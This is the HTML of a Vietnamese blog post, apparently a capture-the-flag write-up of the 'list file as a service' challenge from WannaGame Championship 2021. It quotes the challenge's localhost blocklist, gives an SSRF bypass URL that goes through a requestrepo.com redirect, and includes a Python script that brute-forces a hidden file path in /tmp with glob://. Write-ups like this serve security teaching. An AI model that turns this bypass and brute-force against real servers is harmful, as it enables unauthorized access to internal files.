@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="list file as a serviceBài này là một bài Blind SSRF xD. Mình sẽ không nói nhiều về SSRF mà chỉ tập trung vào phần blind thôi. Mình sẽ để các bài về SSRF trước của mình ở đây, nếu chưa biết về SSRF các">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WannaGame Championship 2021">
+<meta property="og:url" content="https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/index.html">
+<meta property="og:site_name" content="Wのﾑ刀ﾶ乇の11&#39;丂 乃ﾚのム">
+<meta property="og:description" content="list file as a serviceBài này là một bài Blind SSRF xD. Mình sẽ không nói nhiều về SSRF mà chỉ tập trung vào phần blind thôi. Mình sẽ để các bài về SSRF trước của mình ở đây, nếu chưa biết về SSRF các">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/requestrepo.png">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/bypass_ssrf.png">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/tmp.png">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/blind_ssrf.jpg">
+<meta property="og:image" content="https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/flag.png">
+<meta property="article:published_time" content="2021-12-20T10:10:58.000Z">
+<meta property="article:modified_time" content="2022-05-06T05:21:06.730Z">
+<meta property="article:author" content="Wのﾑ刀ﾶ乇の11">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/requestrepo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favion.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>WannaGame Championship 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/12/25/ChristCTF-2021/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/12/14/idek-CTF-2021/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&text=WannaGame Championship 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&is_video=false&description=WannaGame Championship 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WannaGame Championship 2021&body=Check out this article: https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&name=WannaGame Championship 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&t=WannaGame Championship 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#list-file-as-a-service"><span class="toc-number">1.</span> <span class="toc-text">list file as a service</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phan-tich-mot-xiu"><span class="toc-number">1.1.</span> <span class="toc-text">Phân tích một xíu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-php"><span class="toc-number">1.1.1.</span> <span class="toc-text">SSRF.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir-php"><span class="toc-number">1.1.2.</span> <span class="toc-text">dir.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-SSRF"><span class="toc-number">1.2.</span> <span class="toc-text">bypass SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blind-SSRF"><span class="toc-number">1.3.</span> <span class="toc-text">blind SSRF</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        WannaGame Championship 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Wのﾑ刀ﾶ乇の11</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-12-20T10:10:58.000Z" itemprop="datePublished">2021-12-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="list-file-as-a-service"><a href="#list-file-as-a-service" class="headerlink" title="list file as a service"></a>list file as a service</h1><p>Bài này là một bài Blind SSRF xD. Mình sẽ không nói nhiều về SSRF mà chỉ tập trung vào phần blind thôi. Mình sẽ để các bài về SSRF trước của mình ở đây, nếu chưa biết về SSRF các bạn có thể tham khảo:</p>
+<ul>
+<li><a href="https://woanmeo11.github.io/2021/12/14/idek-CTF-2021/">Diff Checker (idek CTF 2021)</a></li>
+<li><a href="https://woanmeo11.github.io/2021/11/30/ISITDTU-CTF-Quals-2021/">Ez SQL (ISITDTU CTF QUALS 2021)</a></li>
+<li><a href="https://woanmeo11.github.io/2021/11/04/Cookie-Arena-Season-1/">A tiny hole (Cookie Arena Season 1)</a></li>
+</ul>
+<h2 id="Phan-tich-mot-xiu"><a href="#Phan-tich-mot-xiu" class="headerlink" title="Phân tích một xíu"></a>Phân tích một xíu</h2><h3 id="SSRF-php"><a href="#SSRF-php" class="headerlink" title="SSRF.php"></a>SSRF.php</h3><p>Nhìn sơ qua hàm <code>filter</code>, đoạn code này sẽ chặn các địa chỉ local và chỉ cho phép 2 scheme đó là <code>http</code> và <code>https</code>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$blacklists</span> = [<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;0.0.0.0&quot;</span>, <span class="string">&quot;127.0.1&quot;</span>,<span class="string">&quot;127.1&quot;</span>,<span class="string">&quot;0&quot;</span>,<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;2130706433&quot;</span>,<span class="string">&quot;0x7f000001&quot;</span>,<span class="string">&quot;0177.0.0.1&quot;</span>];</span><br><span class="line">	<span class="variable">$whitelists</span> = [<span class="string">&quot;http&quot;</span> , <span class="string">&quot;https&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span>(!in_array(<span class="variable">$args</span>[<span class="string">&quot;scheme&quot;</span>],<span class="variable">$whitelists</span>))</span><br><span class="line">		&#123;<span class="keyword">echo</span> <span class="variable">$args</span>[<span class="string">&quot;scheme&quot;</span>];</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(in_array(<span class="variable">$args</span>[<span class="string">&quot;host&quot;</span>],<span class="variable">$blacklists</span>) )&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$args</span>[<span class="string">&quot;host&quot;</span>];</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(strpos(<span class="variable">$args</span>[<span class="string">&quot;query&quot;</span>],<span class="string">&quot;dir_name&quot;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="dir-php"><a href="#dir-php" class="headerlink" title="dir.php"></a>dir.php</h3><p>Mục đích của mình là đến được <code>dir.php</code> và dùng hàm <code>file_get_contents</code> để đọc flag.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]=== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;dir_name&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;dir_name&#x27;</span>]);</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$key</span>-&gt;getType();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">		var_dump(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Khi mình query param <code>dir_name</code> nó sẽ không in ra tên file mà chỉ in ra type do đó không list dir được, nên mình đoán flag sẽ không dễ ăn như kiểu <code>flag.txt</code> mà sẽ được giấu ở đâu đó.</p>
+<h2 id="bypass-SSRF"><a href="#bypass-SSRF" class="headerlink" title="bypass SSRF"></a>bypass SSRF</h2><p>Ở đây mình dùng <code>requestrepo.com</code> và config như sau để bypass đoạn filter trên:</p>
+<p><img src="/2021/12/20/WannaGame-Championship-2021/requestrepo.png" alt="requestrepo"></p>
+<p>Sau khi config xong, đoạn payload mình nặn ra sẽ trông như này:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.122.249.68:10004/SSRF.php?host=http://meo.58c8d7tk.requestrepo.com/dir.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/20/WannaGame-Championship-2021/bypass_ssrf.png" alt="bypass_ssrf"></p>
+<p>Vậy là phần SSRF đã xong, việc còn lại là tìm xem flag được giấu ở đâu.</p>
+<h2 id="blind-SSRF"><a href="#blind-SSRF" class="headerlink" title="blind SSRF"></a>blind SSRF</h2><p>Đề bài có đề cập rằng:</p>
+<blockquote>
+<p>i alway hile my secret in temp </p>
+</blockquote>
+<p>Nên mình đoán flag được giấu ở <code>/tmp</code>. Mình thử query <code>dir_name</code> thì server trả về 3 dir, 2 trong 3 dir đó chính là . và .. vậy thì khả năng cao thư mục còn lại sẽ chứa flag.</p>
+<p><img src="/2021/12/20/WannaGame-Championship-2021/tmp.png" alt="tmp"></p>
+<p>Do không list dir được nên mình lợi dụng wildcard trong wrapper <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.glob.php">glob://</a> để bruteforce hehe =))</p>
+<p><img src="/2021/12/20/WannaGame-Championship-2021/blind_ssrf.jpg" alt="blind_ssrf"></p>
+<p>Đây là đoạn code mình dùng để bruteforce:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase, digits </span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://45.122.249.68:10004/SSRF.php?host=http://meo.58c8d7tk.requestrepo.com/dir.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&#x27;/tmp&#x27;</span></span><br><span class="line">charset = ascii_lowercase + digits + <span class="string">&#x27;._/&#x27;</span></span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    found = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">        r = requests.get(url + <span class="string">f&#x27;?dir_name=glob://<span class="subst">&#123;<span class="built_in">dir</span> + c&#125;</span>*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dir&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">dir</span> += c</span><br><span class="line">            found = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found:&#x27;</span>, <span class="built_in">dir</span> + c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;found:&#x27;</span>, <span class="built_in">dir</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Uraaaaa</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python blind.py</span></span><br><span class="line">...</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">_</span><br><span class="line">.</span><br><span class="line">/</span><br><span class="line">found: /tmp/vkl_dir_hidden/aduvjpflag.xyz</span><br></pre></td></tr></table></figure>
+
+<p>Sau một lúc thì mình bruteforce được path, bây giờ chỉ cần query lên server là xong.</p>
+<p><img src="/2021/12/20/WannaGame-Championship-2021/flag.png" alt="flag"></p>
+<p>Flag: <code>Wanna.One&#123;list_file_ssrf_as_a_service&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#list-file-as-a-service"><span class="toc-number">1.</span> <span class="toc-text">list file as a service</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phan-tich-mot-xiu"><span class="toc-number">1.1.</span> <span class="toc-text">Phân tích một xíu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-php"><span class="toc-number">1.1.1.</span> <span class="toc-text">SSRF.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir-php"><span class="toc-number">1.1.2.</span> <span class="toc-text">dir.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-SSRF"><span class="toc-number">1.2.</span> <span class="toc-text">bypass SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blind-SSRF"><span class="toc-number">1.3.</span> <span class="toc-text">blind SSRF</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&text=WannaGame Championship 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&is_video=false&description=WannaGame Championship 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WannaGame Championship 2021&body=Check out this article: https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&title=WannaGame Championship 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&name=WannaGame Championship 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://woanmeo11.github.io/2021/12/20/WannaGame-Championship-2021/&t=WannaGame Championship 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Wのﾑ刀ﾶ乇の11
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
